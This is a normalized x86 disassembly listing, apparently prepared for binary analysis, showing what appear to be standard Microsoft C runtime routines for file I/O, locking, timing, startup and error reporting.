call sub_40ea93
add esp 0x18
pop ebp
retn
sub_40bef1
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ebc8
add esp 0x14
pop ebp
retn
sub_40bf0f
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ebc8
add esp 0x14
pop ebp
retn
sub_40bf90
mov eax [ rwxdata ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40ef0a
pop ecx
pop ecx
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rwxdata ] eax
xor edx edx
mov ecx rwxdata
jmp r-xdata
push 0x4
push esi
mov [ rwxdata ] esi
call sub_40ef0a
pop ecx
pop ecx
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rwxdata
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rwxdata ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rwxdata
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rwxdata
jl r-xdata
sub_40c061
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rwxdata
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rwxdata
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40f40a
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_40c0a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40f40a
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_40c0d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rwxdata
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rwxdata
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_40f319
pop ecx
pop ebp
retn
sub_40c110
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_40f319
pop ecx
pop ebp
retn
sub_40c13f
push 0xc
push r--data
call sub_40f510
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_40bf8a
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_40c0a2
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_40bf8a
add eax ebx
push eax
call sub_40f43d
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_40bf8a
add eax ebx
push eax
call sub_40d9a9
mov [ ebp - 0x1c ] eax
call sub_40bf8a
add eax ebx
push eax
push edi
call sub_40f4d9
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c1d3
mov eax [ ebp - 0x1c ]
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
call sub_40f555
retn
sub_40c261
mov edi edi
push ebp
mov ebp esp
mov ecx [ rwxdata ]
mov edx [ ebp + 0x8 ]
or ecx 0x1
xor eax eax
cmp [ rwxdata ] ecx
sete al
neg edx
sbb edx edx
and edx ecx
mov [ rwxdata ] edx
pop ebp
retn
sub_40c2a1
push 0xc
push r--data
call sub_40f510
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_40f555
retn
call sub_40faf6
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_40f85f
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c353
mov eax [ ebp - 0x1c ]
call sub_40d1fa
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rwxdata
call sub_40fc30
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40c374
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40c2a1
add esp 0xc
mov [ esi ] eax
test eax eax
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
call sub_40d1fa
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40c3bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x14 ] eax
jbe r-xdata
test esi esi
je r-xdata
push ebx
push 0x0
push ecx
call sub_4105f0
add esp 0xc
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40fd82
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
js r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_40d1fa
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_4105f0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_410551
pop ecx
push eax
call sub_41045b
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_410577
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_40e72d
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_40c594
push 0xc
push r--data
call sub_40f510
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_40c061
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c3bb
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c618
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_40f555
retn
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4105f0
add esp 0xc
sub_40c63f
push 0xc
push r--data
call sub_40f510
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setne al
cmp eax ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] edi
push edi
call sub_40c061
pop ecx
mov [ ebp - 0x4 ] ebx
test [ edi + 0xc ] 0x40
jne r-xdata
call sub_40f555
retn
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push edi
call sub_410551
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c741
mov eax [ ebp - 0x1c ]
push edi
call sub_40f43d
mov esi eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
push edi
call sub_40d9a9
mov [ ebp - 0x1c ] eax
push edi
push esi
call sub_40f4d9
add esp 0x1c
mov ecx rwxdata
cmp eax 0xfffffffe
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rwxdata ]
jmp r-xdata
mov eax rwxdata
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_40c7d5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
sub eax [ rwxdata ]
sbb ecx [ rwxdata ]
xor esi esi
add eax [ ebp - 0x8 ]
push esi
push 0x2710
adc ecx esi
push ecx
push eax
call sub_410840
pop esi
leave
retn
sub_40c80f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp - 0x4 ]
xor esi esi
xor eax eax
add eax [ ebp - 0x8 ]
adc ecx esi
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
xor eax eax
pop esi
leave
retn
sub_40c83d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_40d6cd
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_40f092
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_410551
pop ecx
push eax
call sub_410fa5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_411080
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_40c994
push 0xc
push r--data
call sub_40f510
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_40c061
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c83d
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ca04
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
call sub_40f555
retn
sub_40ca82
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40f092
push esi
mov edi eax
call sub_411b2b
push esi
call sub_410551
push eax
call sub_411a67
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_40b955
and [ esi + 0x1c ] 0x0
pop ecx
sub_40caef
push 0xc
push r--data
call sub_40f510
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40c061
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40ca82
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40cb5b
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_40f555
retn
mov eax [ ebp - 0x1c ]
sub_40cb63
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_40cbb8
mov edi edi
push esi
call sub_41239e
mov esi eax
push esi
call sub_40d536
push esi
call sub_40e555
push esi
call sub_41238f
push esi
call sub_4120e4
push esi
call sub_411bf1
push esi
call sub_411be0
add esp 0x18
pop esi
retn
sub_40cbeb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_40cc08
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40cc2c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rwxdata ]
test eax eax
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
push 0x16
pop eax
pop ebp
retn
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_40cc5c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rwxdata ]
test eax eax
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
push 0x16
pop eax
pop ebp
retn
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_40cc8c
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_412a4f
push r--data
push r--data
call sub_40cc08
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_412b10
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_412a29
call sub_4129ec
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rwxdata ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rwxdata
call sub_412b10
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rwxdata ]
sub_40cd23
push 0x20
push r--data
call sub_40f510
push 0x8
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rwxdata ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ce4e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rwxdata ] eax
mov al [ ebp + 0x10 ]
mov [ rwxdata ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_40f555
retn
mov [ rwxdata ] 0x1
push 0x8
call sub_40f319
pop ecx
push [ ebp + 0x8 ]
call sub_40cb8e
mov [ ebp - 0x20 ] r--data
push [ rwxdata ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rwxdata ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_41239e
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_41239e
mov [ edi ] eax
call ebx
push [ rwxdata ]
call esi
mov ebx eax
push [ rwxdata ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_40cf3b
push 0x58
push r--data
call sub_40f510
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40d2cf
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_41274e
test eax eax
jne r-xdata
push 0x1c
call sub_40cecb
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_412a03
mov [ ebp - 0x4 ] esi
call sub_40ebf2
test eax eax
jns r-xdata
push 0x10
call sub_40cecb
call [ GetCommandLineA@IAT ]
mov [ rwxdata ] eax
call sub_41314b
mov [ rwxdata ] eax
call sub_413090
test eax eax
jns r-xdata
push 0x1b
call sub_40cead
call sub_412e0b
test eax eax
jns r-xdata
push 0x8
call sub_40cead
push 0x1
call sub_40cc8c
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_40cead
call sub_412dac
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_40cead
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_40ce8f
jmp r-xdata
push eax
call sub_40ce63
push ecx
push eax
push esi
push __dos_header
call sub_409f80
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40f555
retn
sub_40d0b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] edx
mov [ rwxdata ] ebx
mov [ rwxdata ] esi
mov [ rwxdata ] edi
mov [ rwxdata ] ss
mov [ rwxdata ] cs
mov [ rwxdata ] ds
mov [ rwxdata ] es
mov [ rwxdata ] fs
mov [ rwxdata ] gs
pushfd
pop [ rwxdata ]
mov eax [ ebp ]
mov [ rwxdata ] eax
mov eax [ ebp + 0x4 ]
mov [ rwxdata ] eax
lea eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x320 ]
mov [ rwxdata ] 0x10001
mov eax [ rwxdata ]
mov [ rwxdata ] eax
mov [ rwxdata ] 0xc0000409
mov [ rwxdata ] 0x1
mov eax [ rwxdata ]
mov [ ebp - 0x328 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rwxdata ] eax
push 0x1
call sub_41327d
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rwxdata ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_41327d
pop ecx
sub_40d1b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rwxdata ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rwxdata ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40d220
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40d20d
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_40d1b8
pop ecx
mov esi eax
call sub_40d1fa
mov [ eax ] esi
pop esi
pop ebp
retn
sub_40d243
mov edi edi
push ebp
mov ebp esp
call sub_412512
test eax eax
jne r-xdata
call sub_40d1fa
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_40d264
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_40d1fa
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_40e72d
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40d289
mov edi edi
push ebp
mov ebp esp
call sub_412512
test eax eax
jne r-xdata
call sub_40d20d
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_40d2aa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_40d20d
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_40e72d
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40d307
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40e6c1
sub_40d328
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_40d34e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40d328
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
push 0x3
call sub_413647
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_413647
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rwxdata ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rwxdata
push edi
call sub_4135e4
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_413290
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rwxdata
push esi
push ebx
mov [ rwxdata ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_40e6c1
push esi
call sub_4135c9
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_4135e4
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_413487
add esp 0xc
test eax eax
jne r-xdata
